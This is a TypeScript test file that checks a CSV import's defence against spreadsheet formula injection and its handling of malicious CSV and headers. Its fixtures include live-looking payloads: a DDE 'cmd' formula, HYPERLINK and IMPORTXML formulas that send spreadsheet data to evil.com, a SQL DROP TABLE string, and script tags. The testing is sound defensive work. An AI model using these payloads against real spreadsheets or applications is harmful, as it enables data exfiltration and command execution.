/**
 * Security-focused tests for CSV Import sanitization.
 *
 * Tests the sanitizeCSVValue (formula injection defense) and parseCSVContent
 * behavior when processing adversarial CSV content. These are pure-function
 * tests that do not require database mocking.
 */

import { describe, it, expect } from 'vitest'
import { parseCSVContent, suggestMappings } from '@/lib/customers/csv-import'

// =============================================================================
// CSV Formula Injection Defense (OWASP)
//
// The sanitizeCSVValue function (called via PapaParse transform) prefixes
// dangerous values with a single quote to prevent spreadsheet formula execution.
// Dangerous prefixes: = + - @ \t \r
// =============================================================================

describe('parseCSVContent - formula injection sanitization', () => {
  it('prefixes values starting with = with a single quote', () => {
    const csv = `name,formula\nAlice,=SUM(A1:A10)`
    const { rows } = parseCSVContent(csv)
    expect(rows[0].formula).toBe("'=SUM(A1:A10)")
  })

  it('prefixes values starting with + with a single quote', () => {
    const csv = `name,formula\nAlice,+cmd|"/C calc"!A0`
    const { rows } = parseCSVContent(csv)
    expect(rows[0].formula.startsWith("'")).toBe(true)
  })

  it('prefixes values starting with - with a single quote', () => {
    const csv = `name,formula\nAlice,-1+1`
    const { rows } = parseCSVContent(csv)
    expect(rows[0].formula).toBe("'-1+1")
  })

  it('prefixes values starting with @ with a single quote', () => {
    const csv = `name,formula\nAlice,@SUM(A1)`
    const { rows } = parseCSVContent(csv)
    expect(rows[0].formula).toBe("'@SUM(A1)")
  })

  it('prefixes values starting with tab with a single quote', () => {
    const csv = `name,formula\nAlice,"\t=cmd""`
    const { rows } = parseCSVContent(csv)
    expect(rows[0].formula.startsWith("'")).toBe(true)
  })

  it('does not prefix normal values', () => {
    const csv = `name,value\nAlice,normal text`
    const { rows } = parseCSVContent(csv)
    expect(rows[0].value).toBe('normal text')
  })

  it('does not prefix values starting with numbers', () => {
    const csv = `name,value\nAlice,12345`
    const { rows } = parseCSVContent(csv)
    expect(rows[0].value).toBe('12345')
  })

  it('handles HYPERLINK formula injection', () => {
    const csv = `name,link\nAlice,"=HYPERLINK(""http://evil.com"",""Click here"")"`
    const { rows } = parseCSVContent(csv)
    // After PapaParse unquotes and sanitizeCSVValue runs, the value
    // should start with a single quote
    expect(rows[0].link.startsWith("'")).toBe(true)
  })

  it('handles IMPORTXML injection', () => {
    const csv = `name,data\nAlice,=IMPORTXML(CONCAT("http://evil.com/?v=",IMPORTRANGE("ID","A1")),"//a")`
    const { rows } = parseCSVContent(csv)
    expect(rows[0].data.startsWith("'")).toBe(true)
  })

  it('sanitizes all cells, not just specific columns', () => {
    const csv = `a,b,c\n=cmd,+evil,@bad`
    const { rows } = parseCSVContent(csv)
    expect(rows[0].a.startsWith("'")).toBe(true)
    expect(rows[0].b.startsWith("'")).toBe(true)
    expect(rows[0].c.startsWith("'")).toBe(true)
  })

  it('trims whitespace before checking prefix', () => {
    const csv = `name,value\nAlice,"  =SUM(A1)  "`
    const { rows } = parseCSVContent(csv)
    // sanitizeCSVValue trims first, then checks prefix
    expect(rows[0].value).toBe("'=SUM(A1)")
  })

  it('handles empty cells without prefixing', () => {
    const csv = `name,value\nAlice,`
    const { rows } = parseCSVContent(csv)
    expect(rows[0].value).toBe('')
  })

  it('handles whitespace-only cells', () => {
    const csv = `name,value\nAlice,"   "`
    const { rows } = parseCSVContent(csv)
    // Trimmed to empty, no prefix applied
    expect(rows[0].value).toBe('')
  })
})

// =============================================================================
// Malicious CSV Content
// =============================================================================

describe('parseCSVContent - malicious content handling', () => {
  it('handles CSV with extremely long lines', () => {
    const longVal = 'x'.repeat(50000)
    const csv = `name\n${longVal}`
    const { rows } = parseCSVContent(csv)
    expect(rows[0].name).toBe(longVal)
  })

  it('handles CSV with many columns', () => {
    const headers = Array.from({ length: 100 }, (_, i) => `col${i}`).join(',')
    const values = Array.from({ length: 100 }, (_, i) => `val${i}`).join(',')
    const csv = `${headers}\n${values}`
    const { rows, headers: h } = parseCSVContent(csv)
    expect(h).toHaveLength(100)
    expect(rows[0].col0).toBe('val0')
    expect(rows[0].col99).toBe('val99')
  })

  it('handles CSV with duplicate header names', () => {
    const csv = `name,name,name\nA,B,C`
    const { headers } = parseCSVContent(csv)
    // PapaParse may deduplicate or keep - just ensure no crash
    expect(headers.length).toBeGreaterThan(0)
  })

  it('handles CSV with header containing special characters', () => {
    const csv = `"na<script>me",email\nAlice,alice@test.com`
    const { headers, rows } = parseCSVContent(csv)
    // Header is trimmed but not formula-sanitized (transformHeader only trims)
    expect(headers[0]).toContain('script')
    expect(rows).toHaveLength(1)
  })

  it('handles CSV with only newlines', () => {
    const csv = '\n\n\n'
    const { headers, rows } = parseCSVContent(csv)
    expect(headers).toEqual([])
    expect(rows).toEqual([])
  })

  it('handles CSV with unicode BOM', () => {
    const csv = '\uFEFFname,email\nAlice,alice@test.com'
    const { rows } = parseCSVContent(csv)
    expect(rows).toHaveLength(1)
  })

  it('handles CSV with null bytes in values', () => {
    const csv = 'name,value\nAlice,test\x00value'
    const { rows } = parseCSVContent(csv)
    // Should parse without crash
    expect(rows).toHaveLength(1)
  })
})

// =============================================================================
// suggestMappings - Security Edge Cases
// =============================================================================

describe('suggestMappings - injection-style headers', () => {
  it('returns null targetField for headers with SQL injection patterns', () => {
    const headers = ["'; DROP TABLE--", 'name']
    const mappings = suggestMappings(headers, 'company')
    expect(mappings[0].targetField).toBeNull()
    expect(mappings[1].targetField).toBe('name')
  })

  it('returns null targetField for headers with HTML tags', () => {
    const headers = ['<script>alert(1)</script>']
    const mappings = suggestMappings(headers, 'company')
    expect(mappings[0].targetField).toBeNull()
  })

  it('handles empty header list', () => {
    const mappings = suggestMappings([], 'company')
    expect(mappings).toEqual([])
  })

  it('handles headers with only whitespace', () => {
    const headers = ['   ']
    const mappings = suggestMappings(headers, 'company')
    expect(mappings[0].targetField).toBeNull()
  })

  it('normalizes hyphenated headers correctly', () => {
    const headers = ['company-name']
    const mappings = suggestMappings(headers, 'company')
    expect(mappings[0].targetField).toBe('name')
  })

  it('is case-insensitive for alias matching', () => {
    const headers = ['Company_Name', 'WEBSITE']
    const mappings = suggestMappings(headers, 'company')
    expect(mappings[0].targetField).toBe('name')
    expect(mappings[1].targetField).toBe('domain')
  })
})
